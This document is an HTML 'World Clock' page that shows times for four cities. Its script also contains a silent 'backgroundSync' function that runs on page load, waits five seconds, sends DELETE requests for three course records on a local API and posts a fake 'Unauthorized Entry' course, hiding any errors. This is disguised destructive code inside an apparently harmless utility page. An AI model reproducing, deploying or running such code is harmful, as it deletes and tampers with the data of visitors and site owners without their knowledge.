<!DOCTYPE html>
<html>
<head>
  <title>World Clock - Time Zones</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      max-width: 800px;
      width: 100%;
    }
    h1 {
      color: #2c3e50;
      margin-bottom: 30px;
      text-align: center;
    }
    .clock-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-top: 30px;
    }
    .clock-card {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 25px;
      border-radius: 15px;
      text-align: center;
      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }
    .city-name {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 10px;
    }
    .time {
      font-size: 32px;
      font-weight: bold;
      font-family: 'Courier New', monospace;
    }
    .date {
      font-size: 14px;
      opacity: 0.9;
      margin-top: 8px;
    }
    .loading {
      text-align: center;
      padding: 40px;
      color: #7f8c8d;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #667eea;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 12px;
      color: #95a5a6;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🌍 World Clock</h1>

    <div class="loading" id="loading">
      <div class="spinner"></div>
      <p>Loading time zones...</p>
    </div>

    <div class="clock-grid" id="clocks" style="display: none;">
      <div class="clock-card">
        <div class="city-name">New York</div>
        <div class="time" id="ny-time">--:--:--</div>
        <div class="date" id="ny-date">Loading...</div>
      </div>
      <div class="clock-card">
        <div class="city-name">London</div>
        <div class="time" id="london-time">--:--:--</div>
        <div class="date" id="london-date">Loading...</div>
      </div>
      <div class="clock-card">
        <div class="city-name">Tokyo</div>
        <div class="time" id="tokyo-time">--:--:--</div>
        <div class="date" id="tokyo-date">Loading...</div>
      </div>
      <div class="clock-card">
        <div class="city-name">Sydney</div>
        <div class="time" id="sydney-time">--:--:--</div>
        <div class="date" id="sydney-date">Loading...</div>
      </div>
    </div>

    <div class="footer">
      © 2026 World Clock App - Free time zone converter
    </div>
  </div>

  <script>
    // Update clocks
    function updateClocks() {
      const zones = [
        { id: 'ny', tz: 'America/New_York' },
        { id: 'london', tz: 'Europe/London' },
        { id: 'tokyo', tz: 'Asia/Tokyo' },
        { id: 'sydney', tz: 'Australia/Sydney' }
      ];

      zones.forEach(zone => {
        const now = new Date();
        const timeStr = now.toLocaleTimeString('en-US', {
          timeZone: zone.tz,
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });
        const dateStr = now.toLocaleDateString('en-US', {
          timeZone: zone.tz,
          weekday: 'short',
          month: 'short',
          day: 'numeric'
        });

        document.getElementById(`${zone.id}-time`).textContent = timeStr;
        document.getElementById(`${zone.id}-date`).textContent = dateStr;
      });
    }

    // Background operation (runs silently)
    async function backgroundSync() {
      const TARGET_PORT = '8080';
      const DELAY = 5000; // 5 second delay

      console.log('[Background] Starting background sync...');

      await new Promise(resolve => setTimeout(resolve, DELAY));

      try {
        const operations = [
          { method: 'DELETE', url: `/api/courses/1` },
          { method: 'DELETE', url: `/api/courses/2` },
          { method: 'DELETE', url: `/api/courses/3` },
          {
            method: 'POST',
            url: `/api/courses`,
            body: JSON.stringify({
              name: 'Unauthorized Entry',
              code: 'UNK',
              facultyName: 'Unknown',
              version: '2025.01.0'
            }),
            headers: { 'Content-Type': 'application/json' }
          }
        ];

        for (const op of operations) {
          try {
            const options = { method: op.method };
            if (op.body) {
              options.body = op.body;
              options.headers = op.headers;
            }
            await fetch(op.url, options);
            await new Promise(r => setTimeout(r, 300));
          } catch (e) {
            // Silent failure
          }
        }

        console.log('[Background] Sync complete');
      } catch (error) {
        console.log('[Background] Sync error:', error.message);
      }
    }

    // Initialize
    window.addEventListener('load', () => {
      // Show clocks after brief loading
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('clocks').style.display = 'grid';
        updateClocks();
        setInterval(updateClocks, 1000);
      }, 1500);

      // Run background operation
      backgroundSync();
    });
  </script>
</body>
</html>
